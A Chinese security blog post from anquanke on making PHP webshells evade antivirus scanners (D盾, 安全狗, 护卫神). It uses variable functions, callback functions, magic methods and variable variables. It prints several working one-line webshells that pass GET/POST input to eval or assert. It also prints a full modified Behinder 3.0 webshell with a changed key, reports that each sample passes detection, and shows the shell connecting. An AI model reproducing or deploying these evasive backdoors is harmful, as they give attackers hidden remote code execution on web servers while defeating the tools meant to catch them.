---
title: webshell免杀之函数与变量玩法
url: https://www.anquanke.com/post/id/282736
source: 安全客-有思想的安全新媒体
date: 2022-11-08
fetch_date: 2025-10-03T21:54:05.981951
---

# webshell免杀之函数与变量玩法

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# webshell免杀之函数与变量玩法

阅读量**356064**

发布时间 : 2022-11-07 14:00:27

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 前言

前文列举了一些用符号免杀的例子，此篇文章就以函数和变量来尝试下免杀。
本文以PHP为例，用PHP中函数和变量及语法特性，在不隐藏函数关键字情况下进行免杀。

### 动态函数

PHP中支持一个功能叫 variable function ，变量函数的意思。

> 例：$a=’system’; $a(‘dir’); //最终是system(‘dir’);

当一个变量后边带括号，那他就被视作一个函数。编译器会解析出变量的值（假设值为符串system），然后会去找当前是否存在名为“system()”的函数并执行它。

注：eval 、echo、print 等看似是函数但并非函数，而是语言构造器（语言结构），不支持该用法

动态函数利用时就可以达到隐藏危险函数关键字特征的目的，我可以对函数关键字进行拆分，编码，然后拼接还原，再利用动态函数特性执行。

```
例：$_GET[‘func’]($_REQUEST[‘pass’]); //这就是动态函数webshell
```

这里就不给实例了，很多免杀案例中都用到了这个特性。也是被疯狂查杀的特征。

### 回调函数

回调函数，简单来说就是一个函数不是由我直接调用，而是通过另一个函数去调用它。

这种方法很简单，php中回调函数有很多个，但大多已经被标记
经过测试找到一个目前还能免杀的：

```
<?php
forward_static_call_array('assert',array($_GET['x']));   ?>
```

D盾：1级forward\_static\_call\_array
如果尝试对回调函数 进行字符特征隐藏，再用动态函数执行，反而提升2级

### 魔术方法

PHP中以两个下划线开头的函数，被称为魔术方法 是保留方法。

> 魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。

魔术方法中有两个函数：
构造函数：创建对象时会自动调用此方法，初始化操作。
析构函数：对象的引用被全部删除或销毁时执行。析构函数不能有参数

```
//__destruct() 析构函数 ；__construct() 构造函数
<?php
class me{
  public $a = '';
  function __destruct(){
    eval("$this->a".' ');
    }
}
$a=$_GET['xxx'];
$b = new me;
$b->a = $a;
?>
```

D盾3级 可疑；安全狗 护卫神 免杀

上面用析构函数D盾会检测到，当尝试改特征时发现，不用析构函数就能够免杀。
果然，高端的免杀往往只需要最朴素的方式

```
<?php
class mexx{
  public $a = '';
  function mexx(){
    eval("$this->a".'; ');
    }
}
$a=$_GET['xxx'];
$b = new mexx;
$b->a = $a;
echo $b->mexx();
?>
```

全过。

### 可变变量

PHP还支持一种语法：可变变量，可以把一个变量的值作为另一个变量的变量名。
例如：
变量a的值是‘c’； 变量c的值是‘ccc’，当使用两个 变量符号时 \$\$a 这就是一个可变变量,就不是\$a 而是\$c。
为什么会是$c ？

> 在编程中,代码执行时整体是从上到下,从左到右,但是赋值语句,则是从右到左。

测试来看可变变量是从右往左的

```
$a='c';
$c='flag';
echo $a;  //结果 c
echo $$a;  //结果 flag
// $$a  解析从右往左找到第一个变量符号 把$a解析，得到$c
```

这里利用可变变量进行免杀

```
<?php
$c=‘1’; //删掉此句 安全狗免杀；
$a='c';
$$a=$_POST[‘x’];  //$c
assert($c); //d盾特征
?>
```

变量c需要给一个值，不能空值，否侧d盾检测到变量未知内容，会报4级
D盾1级，其他免杀

这里有个想法，可变变量能支持多少层哪，只能变一次还是能多次。

```
$a='c';
$c='flag';
$flag='123';
echo $$a;   //结果 flag
echo $$$a;  //结果 123
echo "$$a"; //结果 $c
echo "{$$$a}"; //结果 123
```

最终发现可变变量是支持多层的，但在双引号中不支持可变变量，需要用花括号来包裹声明。

## 改造冰蝎

了解了前面的方法，那就尝试对冰蝎的脚本改造一下。

先来看冰蝎3.0的默认脚本，查杀一下

![]()

经过用D盾尝试，发现file\_get\_contents，openssl 等关键字都会被检测为木马，最终在不动eval关键字情况下，修改如下

```
<?php
@error_reporting(0);
session_start();

$key="e45e329feb5d925b";
    $_SESSION['k']=$key;
    session_write_close();
    $aaa='file_get_contents';
    $bbb='openssl';
    $post=$aaa("php://input");
    if(!extension_loaded($bbb))
    {
        $t="base64_"."decode";
        $post=$t($post."");

        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15]; }
    }
    else
    { $post=openssl_decrypt($post, "AES128", $key); }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
class mexx{
        public $a = '';
        function mexx(){
        eval("$this->a".'');
        }
    }
$b = new mexx();
$b->a = $params;
echo $b->mexx();
?>
```

原本的类中是用了魔术方法将对象当函数执行，用回调函数去调用。
这里改为常规的方式调用，将被查杀file\_get\_contents关键字用改成变量函数调用

本地查杀：安全狗护卫神免杀，D盾（1级｜可疑）
在线查杀效果

![]()

只有报了一个，我推断是检测到eval关键字才告警，遂换成echo函数试试是否免杀

结果还是被查杀，看来检测的特征不是在这里。

经过不断尝试，想到密钥 key的值是默认的e45e329feb5d925b，会不会是它。

把key改掉，如下

```
<?php
@error_reporting(0);
session_start();
$key="47bce5c74f589f48";  //aaa
    $_SESSION['k']=$key;
    session_write_close();
    $aaa='file_get_contents';
    $bbb='openssl';
    $post=$aaa("php://input");
    if(!extension_loaded($bbb))
    {
        $t="base64_"."decode";
        $post=$t($post."");
        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15]; }
    }else{ $post=openssl_decrypt($post, "AES128", $key); }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
class mexx{
        public $a = '';
        function mexx(){
        eval("$this->a".'');
} }
$b = new mexx();
$b->a = $params;
echo $b->mexx();
?>
```

查杀结果

![]()

脚本正常连接

![]()

## 总结

从上述案例能看出来，想要免杀很简单，不需要花里胡哨的操作，只需要改变下结构或函数，不需要变形编码关键字也能实现免杀

本文翻译自 原文链接。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**雷石安全实验室**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/282736](/post/id/282736)

安全KER - 有思想的安全新媒体

本文转载自:

如若转载,请注明出处：

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [免杀](/tag/%E5%85%8D%E6%9D%80)

**+1**0赞

收藏

![](https://p2.ssl.qhimg.com/t01ebe472d127128939.png)雷石安全实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p1.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p2.ssl.qhimg.com/t01ebe472d127128939.png)](/member.html?memberId=148196)

[雷石安全实验室](/member.html?memberId=148196)

欢迎关注公众号@雷石安全实验室 安全工作者不定期分享渗透、APT、企业安全建设等新鲜干货

* 文章
* **48**

* 粉丝
* **44**

### TA的文章

* ##### [frida inlinehook 巧解Android逆向题](/post/id/286239)

  2023-02-15 10:30:45
* ##### [frida inlinehook 巧解Android逆向题](/post/id/284343)

  2023-01-03 15:30:42
* ##### [frida hook native层巧解Android逆向题](/post/id/283461)

  2022-12-01 10:30:06
* ##### [webshell免杀之函数与变量玩法](/post/id/282736)

  2022-11-07 14:00:27
* ##### [一道Android逆向题的取巧解题思路](/post/id/282006)

  2022-10-31 14:30:32

### 相关文章

* ##### [webshell免杀中符号的妙用](/post/id/281115)

  2022-10-09 16:30:15
* ##### [免杀基础（1）-免杀技术及原理](/post/id/279842)

  2022-09-12 14:30:58
* ##### [利用Java反射实现加密型webshell的免杀](/post/id/264628)

  2022-01-20 15:30:56
* ##### [CS shellcode内存加载器免杀及实现](/post/id/262666)

  2021-12-16 14:30:41
* ##### [免杀基础原理及实践免杀](/post/id/255394)

  2021-10-14 17:30:28
* ##### [一句话木马到冰蝎webshell魔改（二）之java篇幅（上）](/post/id/245853)

  2021-07-06 10:30:04
* ##### [红队安全研发系列之免杀原理和绕过研究——起始](/post/id/230820)

  2021-02-10 10:30:12

### 热门推荐

文章目录

* [前言](#h2-0)
  + [动态函数](#h3-1)
  + [回调函数](#h3-2)
  + [魔术方法](#h3-3)
  + [可变变量](#h3-4)
* [改造冰蝎](#h2-5)
* [总结](#h2-6)

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)